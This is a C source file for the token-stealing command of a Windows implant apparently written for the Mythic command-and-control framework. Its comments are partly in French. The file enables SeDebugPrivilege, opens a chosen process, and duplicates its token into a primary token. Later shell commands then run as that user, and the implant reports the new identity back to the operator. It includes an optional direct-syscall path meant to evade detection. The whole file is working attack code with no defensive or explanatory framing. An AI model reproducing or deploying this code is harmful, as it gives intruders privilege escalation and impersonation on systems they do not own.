#define _WIN32_WINNT 0x0600
#include "Checkin.h"
#include "commands.h"
#include "utils.h"
#ifdef EVASION_SYSCALLS
#include "evasion.h"
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#ifdef INCLUDE_CMD_STEAL_TOKEN

/* Enable a privilege in the current process token.
 * Required even if the privilege is "present": Windows requires
 * une activation explicite via AdjustTokenPrivileges.
 * (This comment forces a re-build in Mythic) */

static BOOL enable_privilege(LPCSTR priv_name) {
  HANDLE hToken;
  TOKEN_PRIVILEGES tp;
  LUID luid;

#ifdef EVASION_SYSCALLS
  if (!NT_SUCCESS(kratos_NtOpenProcessToken(GetCurrentProcess(),
                                             TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                                             &hToken)))
    return FALSE;
#else
  if (!OpenProcessToken(GetCurrentProcess(),
                        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    return FALSE;
#endif

  if (!LookupPrivilegeValueA(NULL, priv_name, &luid)) {
    CloseHandle(hToken);
    return FALSE;
  }

  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = luid;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
  BOOL ok = (GetLastError() == ERROR_SUCCESS);
  CloseHandle(hToken);
  return ok;
}

void command_steal_token(char *task_id, char *params) {
  DWORD pid = 0;
  if (params[0] == '{') {
    char *key = strstr(params, "\"pid\"");
    if (key) {
      char *colon = strchr(key, ':');
      if (colon) {
        colon++;
        while (*colon == ' ')
          colon++;
        pid = (DWORD)atoi(colon);
      }
    }
  } else {
    pid = (DWORD)atoi(params);
  }

  if (pid == 0) {
    send_task_response(task_id, "Error: no PID specified");
    return;
  }

  /* Activer SeDebugPrivilege explicitement avant OpenProcess */
  enable_privilege("SeDebugPrivilege");

  /* Ouvrir le processus cible.
   * PROCESS_QUERY_INFORMATION en premier ; fallback sur
   * PROCESS_QUERY_LIMITED_INFORMATION pour les processus SYSTEM restrictifs. */
  HANDLE hProcess = NULL;
#ifdef EVASION_SYSCALLS
  if (!NT_SUCCESS(kratos_NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION, pid)))
    hProcess = NULL;
  if (!hProcess) {
    if (!NT_SUCCESS(kratos_NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION, pid)))
      hProcess = NULL;
  }
#else
  hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
  if (!hProcess)
    hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
#endif
  if (!hProcess) {
    char err[96];
    snprintf(err, sizeof(err),
             "Error: OpenProcess failed (PID %lu, err %lu) - "
             "process may be PPL-protected",
             pid, GetLastError());
    send_task_response(task_id, err);
    return;
  }

  /* Get the process token */
  HANDLE hToken = NULL;
#ifdef EVASION_SYSCALLS
  if (!NT_SUCCESS(kratos_NtOpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken))) {
    char err[64];
    snprintf(err, sizeof(err), "Error: NtOpenProcessToken failed");
    CloseHandle(hProcess);
    send_task_response(task_id, err);
    return;
  }
#else
  if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
    char err[64];
    snprintf(err, sizeof(err), "Error: OpenProcessToken failed (err %lu)",
             GetLastError());
    CloseHandle(hProcess);
    send_task_response(task_id, err);
    return;
  }
#endif
  CloseHandle(hProcess);

  /* Dupliquer en token PRIMAIRE pour CreateProcessWithTokenW. */
  HANDLE hPrimaryToken = NULL;
  if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
                        TokenPrimary, &hPrimaryToken)) {
    char err[64];
    snprintf(err, sizeof(err), "Error: DuplicateTokenEx failed (err %lu)",
             GetLastError());
    CloseHandle(hToken);
    send_task_response(task_id, err);
    return;
  }

  CloseHandle(hToken);

  /* Get the username associated with the token via LookupAccountSid
   * (no impersonation needed, we query the token directly) */
  char username[256] = "unknown";
  DWORD needed = 0;
  GetTokenInformation(hPrimaryToken, TokenUser, NULL, 0, &needed);
  TOKEN_USER *tu = (TOKEN_USER *)malloc(needed);
  if (tu &&
      GetTokenInformation(hPrimaryToken, TokenUser, tu, needed, &needed)) {
    char domain[256] = {0};
    DWORD nlen = sizeof(username), dlen = sizeof(domain);
    SID_NAME_USE use;
    LookupAccountSidA(NULL, tu->User.Sid, username, &nlen, domain, &dlen, &use);
  }
  if (tu)
    free(tu);

  /* Close the previous stolen token if any */
  if (g_stolen_token != NULL) {
    CloseHandle(g_stolen_token);
    RevertToSelf();
  }

  /* Store the primary token - execute_shell will now use it via
   * CreateProcessWithTokenW */
  g_stolen_token = hPrimaryToken;

  // Trigger immediate checkin to update Mythic UI
  char display_user[512] = {0};
  get_current_display_user(display_user, sizeof(display_user));
  CheckinSend(display_user);

  char msg[640];
  snprintf(msg, sizeof(msg),
           "Token stolen from PID %lu. Impersonating: %s\n"
           "Identity updated to: %s\n"
           "All subsequent shell commands will run under this token.",
           pid, username, display_user);
  send_task_response(task_id, msg);
}
#endif
